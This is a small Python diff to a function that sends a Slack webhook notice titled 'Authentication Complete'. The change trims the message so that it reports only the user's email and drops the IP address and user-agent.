@@ -36,7 +36,7 @@ def notify_authenticated(webhook,email):
 			"type": "section",
 			"text": {
 				"type": "mrkdwn",
-				"text": f":shark: *Authentication Complete*\n*Email*\n{email}\n*Address*\n<https://whatismyipaddress.com/ip/{IP}|{IP}>\n*User-Agent*\n{useragent}"
+				"text": f":shark: *Authentication Complete*\n*Email*\n{email}"
 			}
 		})
   webhook.send( text = "fallback", blocks = blocks )
